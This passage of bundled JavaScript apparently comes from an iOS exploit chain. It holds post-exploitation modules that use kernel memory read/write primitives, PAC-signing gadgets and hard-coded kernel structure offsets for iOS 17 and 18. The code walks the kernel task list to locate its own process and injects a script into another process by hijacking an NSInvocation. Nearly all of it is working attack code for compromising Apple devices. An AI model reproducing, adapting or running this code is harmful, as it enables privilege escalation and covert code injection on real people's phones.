		const nativeCallBuff = this.task.call(100, "JSObjectMakeArrayBufferWithBytesNoCopy", jsctx, callBuff, 0x4000);
		const globalObject = this.task.call(100, "JSContextGetGlobalObject", jsctx);
		const jsName = this.task.call(100, "JSStringCreateWithUTF8CString", mem);
		this.task.call(100, "JSObjectSetProperty", jsctx, globalObject, jsName, nativeCallBuff);

		let localCallBuff = new BigUint64Array(34);
		
		// Second (final) __invoking__ arguments
		localCallBuff[0] = 0x41414141n;	// this should be overwritten at every function call
		localCallBuff[1] = resultBuff; // Result buffer
		localCallBuff[2] = argsBuff; // Arguments buffer
		localCallBuff[3] = 0x120n; // args buff size. Do not touch!

		// First __invoking__ arguments
		localCallBuff[10] = this.#invokingAddr;
		localCallBuff[11] = resultBuff;
		localCallBuff[12] = callBuff;
		localCallBuff[13] = 0xe0n;

		// Some offsets we export to JS
		localCallBuff[20] = callBuff;
		localCallBuff[21] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "dlsym"), 0 );
		localCallBuff[22] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "memcpy"), 0 );
		localCallBuff[23] = this.task.pac( Native.callSymbol("dlsym", RTLD_DEFAULT, "malloc"), 0 );
		localCallBuff[24] = oinv;
		localCallBuff[25] = jsctx;
		localCallBuff[26] =  true ? 1n : 0;	// we pass true if DEBUG is set
		localCallBuff[27] = 1n;
		localCallBuff[28] = 0n;
		localCallBuff[29] = 0n;
		localCallBuff[30] = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].getKernelBase();
		let desiredPacGadget = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].getPaciaGadget();
		// retreiving correct modifier for 18.4 and above
		if (globalThis.xnuVersion.major == 24 && globalThis.xnuVersion.minor >= 4) {
			desiredPacGadget = Native.pacia(Native.strip(desiredPacGadget),0n);
		}
		localCallBuff[31] = desiredPacGadget;
		localCallBuff[32] = BigInt(agentPid);
		localCallBuff[33] = jscontext;

		//console.log(TAG, "dlsym: " + Utils.hex(localCallBuff[21]));
		//console.log(TAG, "memcpy: " + Utils.hex(localCallBuff[22]));
		//console.log(TAG, "malloc: " + Utils.hex(localCallBuff[23]));

		const nativeLocalBuff = Native.callSymbol("malloc", localCallBuff.byteLength);
		Native.write(nativeLocalBuff, localCallBuff.buffer);
		this.task.write(callBuff, nativeLocalBuff, localCallBuff.byteLength);
		Native.callSymbol("free", nativeLocalBuff);

		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff, 0);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x8n, 1);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x10n, 2);
		this.#callObjc(inv, "setArgument:atIndex:", firstInvokingBuff + 0x18n, 3);

		// This NSInvocation should in turn call the final NSInvocation we created before,
		// but with fully controlled arguments
		this.task.write64(mem, this.#invokingAddr);
		this.#callObjc(jsinv, "setTarget:", inv);
		this.#callObjc(jsinv, "setSelector:", this.#invokeUsingIMPSel);
		this.#callObjc(jsinv, "setArgument:atIndex:", mem, 2);

		// Replace NSInvocation
		this.task.write64(storval + 0x10n, jsinv);
		this.task.write64(storval + 0x18n, 0n);
		//console.log(TAG, "NSInvocation replaced");

		// Write loader.js in remote task
		//const loaderJS = "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();";
		console.log(TAG, "JS script length: " + this.#injectCode.length);
		const scriptMem = this.task.call(100, "calloc", 1, this.#injectCode.length + 1);
		const scriptStr = this.#writeCFStr(scriptMem, this.#injectCode);
		this.task.call(100, "free", scriptMem);
		//console.log(TAG, "scriptStr: " + Utils.hex(scriptStr));

		// Check if we write ok
		// console.log(TAG,"Check if we write ok" )
		// const a = Native.callSymbol("malloc", this.#injectCode.length + 1);
		// const len = this.#callObjc(scriptStr, "length");
		// console.log(TAG, len);
		// const b = this.#callObjc(scriptStr, "UTF8String");
		// this.task.read(b, a, this.#injectCode.length + 1);
		// const c = Native.readString(a, this.#injectCode.length);
		// console.log(TAG, c);
		

		//const loaderStr = this.#writeCFStr(mem, "loader");
		//this.#callObjc(jscontext, "setObject:forKeyedSubscript:", scriptStr, loaderStr);
		//console.log(TAG, "loaderStr: " + Utils.hex(loaderStr));

		console.log(TAG, "Starting JS script for target: " + this.#target);

		//const evaluateStr = this.#writeCFStr(mem, "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();");
		//const evaluateStr = this.#writeCFStr(mem, "invoker();");
		//const evaluateStr = this.#writeCFStr(mem, "eval(loader);");
		//const evaluateStr = this.#writeCFStr(mem, scriptStr);
		this.#callObjc(jscontext, "evaluateScript:", scriptStr);
		//this.#callObjcInBackground(jscontext, "evaluateScript:", scriptStr);
		//this.#callObjc(jscontext, "evaluateScript:", evaluateStr);

		// Read data from result
		//const retVal = this.task.read64(resultBuff);
		//console.log(TAG, "Result: " + retVal);

		console.log(TAG, "All done!");

		return true;
	}

	#findInvoking() {
		//console.log(TAG, "Find 'invoking()'...");

		let startAddr = Native.dlsym("_CF_forwarding_prep_0");
		startAddr = startAddr & 0x7fffffffffn; //Chain.strip(startAddr);
		//console.log(TAG, "startAddr: " + Utils.hex(startAddr));

		if (!startAddr)
			return 0;

		if (xnuVersion.major == 24 && xnuVersion.minor >= 5)
			startAddr -= 0x2500n;
		else
			startAddr -= 0x4000n;

		const pattern = new Uint8Array([0x67, 0x1D, 0x40, 0xF9, 0x66, 0x19, 0x40, 0xF9, 0x65, 0x15, 0x40, 0xF9, 0x64, 0x11, 0x40, 0xF9]);
		Native.write(Native.mem, pattern.buffer);
		let foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
		//console.log(TAG, "foundAddr: " + Utils.hex(foundAddr));

		if (!foundAddr) {
			// special case for iOS 17.4-17.4.1
			//console.log(TAG,`Didnt found invoking,trying to find it for special version`);
			startAddr = Native.dlsym("CFCharacterSetIsCharacterMember");
			startAddr = startAddr & 0x7fffffffffn;
			foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
			//console.log(TAG,`foundAddr:${Utils.hex(foundAddr)}`);
			if (!foundAddr)
				return 0;
		}

		const buff = Native.read(foundAddr - BigInt(Native.memSize), Native.memSize);
		const buff32 = new Uint32Array(buff);

		for (let i=buff32.length-1; i>=0; i--) {
			foundAddr -= 0x4n;
			if (buff32[i] == 0xd503237f) {
				const found = foundAddr;
				console.log(TAG, "Invoking found: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(found));
				return found;
			}
		}

		return 0;
	}

	#callObjc(obj, selName, ...args) {
		const sel = Native.callSymbol("sel_registerName", selName);
		return this.task.call(1000, "objc_msgSend", obj, sel, ...args);
	}

	#callObjcRetain(obj, selName, ...args) {
		const ret = this.#callObjc(obj, selName, ...args);
		this.#callObjc(ret, "retain");
		return ret;
	}

	#callObjcInBackground(obj, selName, ...args) {
		const performSelectorInBackground = Native.callSymbol("sel_registerName", "performSelectorInBackground:withObject:");
		const sel = Native.callSymbol("sel_registerName", selName);
		return this.task.call(1000, "objc_msgSend", obj, performSelectorInBackground, sel, ...args);
	}

	#writeCFStr(dst, str) {
		const kCFStringEncodingUTF8 = 0x08000100;
		this.task.writeStr(dst, str);
		return this.task.call(100, "CFStringCreateWithCString", 0, dst, kCFStringEncodingUTF8);
	}

	#printClass(obj) {
		const cl = this.#callObjc(obj, "class");
		const desc = this.#callObjc(cl, "description");
		const str = this.#callObjc(desc, "UTF8String");
		this.task.read(str, Native.mem, 32);
		const classDesc = Native.readString(Native.mem);
		console.log(TAG, "class: " + classDesc);
	}
}


/***/ }),

/***/ "./src/libs/Chain/Chain.js":
/*!*********************************!*\
  !*** ./src/libs/Chain/Chain.js ***!
  \*********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Chain)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");


const TAG = "CHAIN"

class Chain
{
	static #driver;
	static #mutex;

	static init(driver, mutex=null)
	{
		this.#driver = driver;
		this.#mutex = mutex;
	}

	static destroy()
	{
		this.#driver.destroy();
	}

	static runPE()
	{
		return this.#driver.runPE();
	}

	static getKernelBase()
	{
		return this.#driver.getKernelBase();
	}

	static getSelfTaskAddr()
	{
		return this.#driver.getSelfTaskAddr();
	}

	static read(srcAddr, dst, len)
	{
		this.#mutexLock();
		let ret = this.#driver.read(srcAddr, dst, len);
		this.#mutexUnlock();
		return ret;
	}

	static write(dst, src, len)
	{
		this.#mutexLock();
		let ret = this.#driver.write(dst, src, len);
		this.#mutexUnlock();
		return ret;
	}

	static readBuff(srcAddr, len)
	{
		if (!this.read(srcAddr, Native.mem, len))
			return false;
		return Native.read(Native.mem, len);
	}

	static read8(src)
	{
		this.read(src, Native.mem, 1);
		return Native.read8(Native.mem);
	}

	static read16(src)
	{
		this.read(src, Native.mem, 2);
		return Native.read16(Native.mem);
	}

	static read32(src)
	{
		this.read(src, Native.mem, 4);
		return Native.read32(Native.mem);
	}

	static read64(src)
	{
		this.read(src, Native.mem, 8);
		return Native.read64(Native.mem);
	}

	static write8(dst, value)
	{
		Native.write8(Native.mem, value);
		this.write(dst, Native.mem, 1);
	}

	static write16(dst, value)
	{
		Native.write16(Native.mem, value);
		this.write(dst, Native.mem, 2);
	}

	static write32(dst, value)
	{
		Native.write32(Native.mem, value);
		this.write(dst, Native.mem, 4);
	}

	static write64(dst, value)
	{
		Native.write64(Native.mem, value);
		this.write(dst, Native.mem, 8);
	}

	static offsets()
	{
		return this.#driver.offsets();
	}

	static strip(val)
	{
		return this.#driver.strip(val);
	}

	static writeZoneElement(dstAddr,src,len)
	{
		return this.#driver.writeZoneElement(dstAddr, src, len);
	}

	static getPaciaGadget()
	{
		return this.#driver.getPaciaGadget();
	}
	static getClearPaciaGadget()
	{
		return this.#driver.getClearPaciaGadget();
	}

	static transferRW()
	{
		let rwCtx = this.#driver.transferRW();
		let controlSocket = rwCtx.controlSocket;
		let rwSocket = rwCtx.rwSocket;
		console.log(TAG, "controlSocket: " + controlSocket);
		console.log(TAG, "rwSocket: " + rwSocket);

		let portPtr = Native.mem;
		Native.callSymbol("fileport_makeport", controlSocket, portPtr);
		let controlPort = Native.read32(portPtr);

		Native.callSymbol("fileport_makeport", rwSocket, portPtr);
		let rwPort = Native.read32(portPtr);

		return {
			controlPort: controlPort,
			rwPort: rwPort,
			controlSocket: controlSocket,
			rwSocket: rwSocket
		};
	}

	static threadSpawn(scriptCFString, threadMem) {
		this.#driver.threadSpawn(scriptCFString, threadMem);
	}

	static testKRW() {
		console.log(TAG, "Testing KRW");
		console.log(TAG, "- kernelBase: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(this.getKernelBase()));
		console.log(TAG, "- PACIA gadget: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(this.getPaciaGadget()));
		console.log(TAG, "- Read kernel magic (4 bytes)");

		let buff = this.readBuff(this.getKernelBase(), 4);
		if (!buff) {
			console.log(TAG, "kernel RW not working!");
			return false;
		}
		let buff32 = new Uint32Array(buff);
		console.log(TAG, `- Magic: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(buff32[0])}`);

		if (buff32[0] != 0xfeedfacf) {
			console.log(TAG, "Invalid magic!");
			return false;
		}

		return true;
	}

	static #mutexLock() {
		if (this.#mutex)
			Native.callSymbol("pthread_mutex_lock", this.#mutex);
	}

	static #mutexUnlock() {
		if (this.#mutex)
			Native.callSymbol("pthread_mutex_unlock", this.#mutex);
	}
}


/***/ }),

/***/ "./src/libs/Chain/Native.js":
/*!**********************************!*\
  !*** ./src/libs/Chain/Native.js ***!
  \**********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Native)
/* harmony export */ });
const RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;

class Native {

	// Preallocated memory chunk for general purpose stuff for public use
	static mem = 0n;
	static memSize = 0x4000;

	// Preallocated memory chunk for encoding/decoding of string arguments
	static #argMem = 0n;

	// Pointer to next available memory for native argument
	static #argPtr = 0n;

	static {
		this.mem = this.callSymbol("malloc", this.memSize);
		this.#argMem = this.callSymbol("malloc", 0x1000n);
		this.#argPtr = this.#argMem;
	}

	static write(ptr, buff) {
		let buffPtr = read64(read64(addrof(buff) + 0x10n) + 0x10n);
		this.callSymbol("memcpy", ptr, buffPtr, buff.byteLength);
	}
	static write32(ptr, value) {
		let buffWrite = new ArrayBuffer(4);
		const view = new DataView(buffWrite);
		view.setUint32(0, value, true);
		this.write(ptr, buffWrite);
	}

	static read(ptr, length) {
		let buffRes = new ArrayBuffer(length);
		let buffPtr = read64(read64(addrof(buffRes) + 0x10n) + 0x10n);
		this.callSymbol("memcpy", buffPtr, ptr, length);
		return buffRes;
	}

	static read8(ptr) {
		let buff = this.read(ptr, 1);
		const view = new DataView(buff);
		return view.getUint8(0);
	}

	static read16(ptr) {
		let buff = this.read(ptr, 2);
		const view = new DataView(buff);
		return view.getUint16(0, true);
	}

	static read32(ptr) {
		let buff = this.read(ptr, 4);
		const view = new DataView(buff);
		return view.getUint32(0, true);
	}

	static read64(ptr) {
		let buff = this.read(ptr, 8);
		const view = new DataView(buff);
		return view.getBigUint64(0, true);
	}

	static readPtr(ptr) {
		return this.read64(ptr);
	}

	static readString(ptr, len=1024) {
		let buff = this.read(ptr, len);
		return this.bytesToString(buff, false);
	}

	static write8(ptr, value) {
		let buffWrite = new ArrayBuffer(1);
		const view = new DataView(buffWrite);
		view.setUint8(0, value);
		this.write(ptr, buffWrite);
	}

	static write16(ptr, value) {
		let buffWrite = new ArrayBuffer(2);
		const view = new DataView(buffWrite);
		view.setUint16(0, value, true);
		this.write(ptr, buffWrite);
	}

	static write32(ptr, value) {
		let buffWrite = new ArrayBuffer(4);
		const view = new DataView(buffWrite);
		view.setUint32(0, value, true);
		this.write(ptr, buffWrite);
	}

	static write64(ptr, value) {
		let buffWrite = new ArrayBuffer(8);
		const view = new DataView(buffWrite);
		view.setBigUint64(0, value, true);
		this.write(ptr, buffWrite);
	}

	static writeString(ptr, str) {
		//const buff = this.stringToBytes(str, true);
		//this.write(ptr, buff);
		this.callSymbol("memcpy", ptr, str, str.length + 1);
	}

	static getCString(str) {
		return get_cstring(str);
	}

	static #prepareArg(arg) {
		if(!arg)
			arg = 0n;
		if(typeof(arg) === "string")
			return get_cstring(arg);
		return BigInt(arg);
	}

	static strip(address) {
		return address & 0x7fffffffffn;
	}

	static pacia(address, modifier) {
		address = Native.strip(address);
		//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);
		let signedAddress = pacia(address, BigInt(modifier));
		//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);
		return signedAddress;
	}

	static dlsym(name) {
		return Native.callSymbol("dlsym", RTLD_DEFAULT, name);
	}

	static callSymbol(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {
		let funcSymbol = null;
		if(name === "dlysm")
			funcSymbol = DLSYM;
		else
			funcSymbol = fcall(DLSYM,RTLD_DEFAULT,get_cstring(name));
		a0 = this.#prepareArg(a0);
		a1 = this.#prepareArg(a1);
		a2 = this.#prepareArg(a2);
		a3 = this.#prepareArg(a3);
		a4 = this.#prepareArg(a4);
		a5 = this.#prepareArg(a5);
		a6 = this.#prepareArg(a6);
		a7 = this.#prepareArg(a7);
		a8 = this.#prepareArg(a8);
		a9 = this.#prepareArg(a9);
		a10 = this.#prepareArg(a10);
		a11 = this.#prepareArg(a11);
		a12 = this.#prepareArg(a12);
		a13 = this.#prepareArg(a13);
		a14 = this.#prepareArg(a14);
		a15 = this.#prepareArg(a15);
		let chosen_fcall = null;
		if(typeof fcall_with_pacia !== 'undefined')
			chosen_fcall = fcall_with_pacia;
		else
			chosen_fcall = fcall;
		const ret64 = chosen_fcall(funcSymbol, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15);
		if (ret64 < 0xffffffffn && ret64 > -0xffffffffn)
			return Number(ret64);
		if (ret64 == 0xffffffffffffffffn)
			return -1;
		return ret64;
	}

	static callSymbolRetain(name, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15) {
		return Native.callSymbol(name,a0,a1,a2,a3,a4,a5,a6,a7,a8, a9, a10, a11, a12, a13, a14, a15);
	}

	static bytesToString(bytes, includeNullChar=true) {
		let bytes8 = new Uint8Array(bytes);
		let str = "";
		for (let i=0; i<bytes8.length; i++) {
			if (!includeNullChar && !bytes8[i])
				break;
			str += String.fromCharCode(bytes8[i]);
		}
		return str;
	}

	static stringToBytes(str, nullTerminated=false) {
		let buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));
		let s8 = new Uint8Array(buff);
		for (let i=0; i<str.length; i++)
			s8[i] = str.charCodeAt(i);
		if (nullTerminated)
			s8[str.length] = 0x0;
		return s8.buffer;
	}

	static #doNativeCall(func, name, x0, x1, x2, x3, x4, x5, x6, x7) {
		// Initialize argPtr to point to general purpose memory chunk
		this.#argPtr = this.#argMem;
		x0 = this.#toNative(x0);
		x1 = this.#toNative(x1);
		x2 = this.#toNative(x2);
		x3 = this.#toNative(x3);
		x4 = this.#toNative(x4);
		x5 = this.#toNative(x5);
		x6 = this.#toNative(x6);
		x7 = this.#toNative(x7);
		let ret = func(name, x0, x1, x2, x3, x4, x5, x6, x7);
		// Reset argPtr
		this.#argPtr = this.#argMem;
		return this.#fromNative(ret);
	}

	static #fromNative(value) {
		if (!(value instanceof ArrayBuffer))
			return value;
		const view = new DataView(value);
		return view.getBigInt64(0, true);
	}

	static #toNative(value) {
		// Strings need to be manually written to native memory
		if (typeof value === 'string') {
			let ptr = this.#argPtr;
			this.writeString(ptr, value);
			this.#argPtr += BigInt(value.length + 1);
			return this.#bigIntToArray(ptr);
		}
		else if (typeof value === 'bigint') {
			return this.#bigIntToArray(value);
		}
		else
			return value;
	}

	static #bigIntToArray(value) {
		let a = new Uint8Array(8);
		for (let i=0; i<8; i++) {
			a[i] = Number(value & 0xffn)
			value >>= 8n;
		}
		return a.buffer;
	}
	static gc() {
	}
}

// Register global Native class
globalThis.Native = Native;


/***/ }),

/***/ "./src/libs/Chain/OffsetsStruct.js":
/*!*****************************************!*\
  !*** ./src/libs/Chain/OffsetsStruct.js ***!
  \*****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ OffsetsStruct)
/* harmony export */ });
const OFFSET_KERNEL_BASE  = 0xfffffff007004000n
//const OFFSET_KERNEL_TASK  = 0x925770n // iOS 17.5.1 - iPhone 13/13 pro max
//const OFFSET_KERNEL_TASK 0x91d318 // iOS 17.4.1 - iPhone 13 pro max
const OFFSET_KERNEL_TASK = 0x0n
const OFFSET_TASK_MAP = 0x28n
const OFFSET_TASK_NEXT = 0x30n
const OFFSET_TASK_PREV = 0x38n
const OFFSET_TASK_THREADS = 0x58n
const OFFSET_TASK_IPC_SPACE = 0x300n
const OFFSET_TASK_PROC_RO = 0x3a0n
const OFFSET_TASK_PROC_SIZE = 0x740n // iOS 17.5.1
const OFFSET_TASK_EXC_GUARD = 0x5d4n

const OFFSET_IPC_SPACE_TABLE = 0x20n
const OFFSET_IPC_ENTRY_OBJECT =	0x0n
const OFFSET_IPC_OBJECT_KOBJECT = 0x48n
const OFFSET_IPC_PORT_IP_NSREQUEST = 0x58n
const OFFSET_IPC_PORT_IP_SORIGHTS = 0x84n

const OFFSET_PROC_PID = 0x60n
const OFFSET_PROC_P_COMM = 0x568n

const OFFSET_THREAD_OPTIONS = 0x70n
const OFFSET_THREAD_KSTACKPTR = 0xf0n
const OFFSET_THREAD_ROP_PID = 0x160n
const OFFSET_THREAD_JOP_PID = 0x168n
const OFFSET_THREAD_GUARD_EXC_CODE = 0x330n
const OFFSET_THREAD_TASK_THREADS = 0x370n
const OFFSET_THREAD_TRO = 0x380n
const OFFSET_THREAD_AST = 0x3a4n
const OFFSET_THREAD_MUTEX_DATA = 0x3b0n
const OFFSET_THREAD_CTID = 0x430n

const OFFSET_TRO_TASK = 0x20n

const OFFSET_VM_HDR_RBH_ROOT = 0x38n
const OFFSET_VM_RBE_LEFT = 0x0n
const OFFSET_VM_RBE_RIGHT = 0x8n

const OFFSET_VM_OBJECT_VOU_SIZE = 0x18n
const OFFSET_VM_OBJECT_REF_COUNT = 0x28n

const OFFSET_VM_NAMED_ENTRY_COPY = 0x10n
const OFFSET_VM_NAMED_ENTRY_NEXT = 0x20n

const OFFSET_MIG_LOCK = 0x0n;
const OFFSET_MIG_SBXMSG = 0x0n;
class OffsetsStruct
{
	constructor() {
		this.baseKernel = OFFSET_KERNEL_BASE;
		this.kernelTask = OFFSET_KERNEL_TASK;
		this.T1SZ_BOOT = 17n;

		this.mapTask = OFFSET_TASK_MAP;
		this.nextTask = OFFSET_TASK_NEXT;
		this.prevTask = OFFSET_TASK_PREV;
		this.threads = OFFSET_TASK_THREADS;
		this.ipcSpace = OFFSET_TASK_IPC_SPACE;
		this.procRO = OFFSET_TASK_PROC_RO;
		this.procSize = OFFSET_TASK_PROC_SIZE;
		this.excGuard = OFFSET_TASK_EXC_GUARD;

		this.spaceTable = OFFSET_IPC_SPACE_TABLE;
		this.entryObject = OFFSET_IPC_ENTRY_OBJECT;
		this.objectKObject = OFFSET_IPC_OBJECT_KOBJECT;
		this.ipNsRequest = OFFSET_IPC_PORT_IP_NSREQUEST;
		this.ipSorights = OFFSET_IPC_PORT_IP_SORIGHTS;

		this.pid = OFFSET_PROC_PID;
		this.pComm = OFFSET_PROC_P_COMM;

		this.options = OFFSET_THREAD_OPTIONS;
		this.kstackptr = OFFSET_THREAD_KSTACKPTR;
		this.ropPid = OFFSET_THREAD_ROP_PID;
		this.jopPid = OFFSET_THREAD_JOP_PID;
		this.guardExcCode = OFFSET_THREAD_GUARD_EXC_CODE;
		this.taskThreads = OFFSET_THREAD_TASK_THREADS;
		this.tro = OFFSET_THREAD_TRO;
		this.ast = OFFSET_THREAD_AST;
		this.mutexData = OFFSET_THREAD_MUTEX_DATA;
		this.ctid = OFFSET_THREAD_CTID;

		this.troTask = OFFSET_TRO_TASK;

		this.hdrRBHRoot = OFFSET_VM_HDR_RBH_ROOT;
		this.rbeLeft = OFFSET_VM_RBE_LEFT;
		this.rbeRight = OFFSET_VM_RBE_RIGHT;

		this.vouSize = OFFSET_VM_OBJECT_VOU_SIZE;
		this.refCount = OFFSET_VM_OBJECT_REF_COUNT;

		this.backingCopy = OFFSET_VM_NAMED_ENTRY_COPY;
		this.next = OFFSET_VM_NAMED_ENTRY_NEXT;
		this.migLock = OFFSET_MIG_LOCK;
		this.migSbxMsg = OFFSET_MIG_SBXMSG;
	}
}


/***/ }),

/***/ "./src/libs/Driver/Driver.js":
/*!***********************************!*\
  !*** ./src/libs/Driver/Driver.js ***!
  \***********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ DriverPostExpl)
/* harmony export */ });
/* harmony import */ var _Offsets__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./Offsets */ "./src/libs/Driver/Offsets.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");




const TAG = "DRIVER-POSTEXPL"

class DriverPostExpl
{
	#offsets;
	#kernelBase;

	constructor() {
		this.#offsets = _Offsets__WEBPACK_IMPORTED_MODULE_0__["default"].getByDeviceAndVersion();
	}

	runPE() {
		console.log(TAG, `runPE()`);
		if (!this.#offsets) {
			console.log(TAG, `Offsets were not obtained, aborting`);
			return false;
		}
		/*
		let baseKernel = startSandworm();
		if (baseKernel == -1)
			return false;
		*/
		this.#kernelBase = mpd_kernel_base();

		return true;
	}

	getPaciaGadget() {
		return mpd_pacia_gadget();
	}

	getKernelBase() {
		return this.#kernelBase;
	}

	getSelfTaskAddr() {
		console.log(TAG, `getSelfTaskAddr`);

		let selfTaskKaddr = 0;
		for (let i=0; i<5; i++)
		{
			selfTaskKaddr = this.#findSelfTaskKaddr(true);
			if (!selfTaskKaddr)
			{
				console.log(TAG, `Searching the other way around`);
				selfTaskKaddr = this.#findSelfTaskKaddr(false);
			}
			else
				break;
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep",20000);
		}
		return selfTaskKaddr;
	}

	#findSelfTaskKaddr(direction) {
		let kernelTaskAddr = this.#kernelBase + this.#offsets.kernelTask;
		console.log(TAG, `baseKernel: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(this.#kernelBase)}, kernelTask: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(kernelTaskAddr)}`);

		let kernelTaskVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		this.read(kernelTaskAddr, kernelTaskVal, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		kernelTaskVal = uread64(kernelTaskVal);
		//console.log(TAG,`kernelTaskval:${kernelTaskVal}`);
		kernelTaskVal = BigInt(kernelTaskVal);
		//console.log(TAG,`kernelTaskval:${Utils.hex(kernelTaskVal)}`);
		let ourPid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("getpid");
		console.log(TAG, `Our pid:${ourPid}`);
		let nextTask = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n;
		if (direction)
			this.read(kernelTaskVal + this.#offsets.nextTask, nextTask, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		else
			this.read(kernelTaskVal + this.#offsets.prevTask, nextTask, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
		nextTask = uread64(nextTask);
		//console.log(TAG,`nextTask:${Utils.hex(nextTask)}`);

		while (nextTask != 0 && nextTask != kernelTaskVal) {
			let procROAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			this.read(nextTask + this.#offsets.procRO, procROAddr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
			procROAddr = uread64(procROAddr);
			//console.log(TAG,`procROAddr:${Utils.hex(procROAddr)}`);
			let procVal = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			this.read(procROAddr, procVal, 8);
			procVal = BigInt(uread64(procVal));
			//console.log(TAG,`procVal:${Utils.hex(procVal)}`);
			if (procVal && this.strip(procVal) > 0xffffffd000000000n) {
				let pid = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
				this.read(procVal + this.#offsets.pid, pid, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				let buffRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(pid, 4);
				let view = new DataView(buffRes);
				pid = view.getUint32(0,true);
				//console.log(TAG,`pid:${Utils.hex(pid)}`);
				if (pid == ourPid) {
					console.log(TAG, `Found our pid`);
					return nextTask;
				}
				let nextTaskLocation = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
				if (direction)
					this.read(nextTask + this.#offsets.nextTask, nextTaskLocation, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				else
					this.read(nextTask + this.#offsets.prevTask, nextTaskLocation, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].UINT64_SIZE);
				nextTask = uread64(nextTaskLocation);
			}
			else
				break;
		}
		return false;
	}

	read(srcAddr, dst, len) {
		srcAddr = this.strip(srcAddr);
		if (srcAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot read: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(srcAddr)}`);
			return false;
		}
		kread_length(srcAddr,dst, len);
		return true;
	}

	write(dst, src, len) {
		let dstAddr = this.strip(dst);
		if (dstAddr < 0xffffffd000000000n) {
			console.log(TAG, `Invalid kaddr, cannot write:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(dstAddr)}`);
			return false;
		}
		kwrite_length(dst, src, len);
		return true;
	}

	writeZoneElement(dstAddr, src, len) {
		return kwrite_zone_element(dstAddr, src, len);
	}

	offsets() {
		return this.#offsets;
	}

	strip(val) {
		return xpac(val);
	}

	transferRW() {
		return {
			controlSocket: mpd_control_socket(),
			rwSocket: mpd_rw_socket()
		};
	}

	threadSpawn(scriptCFString, threadMem) {
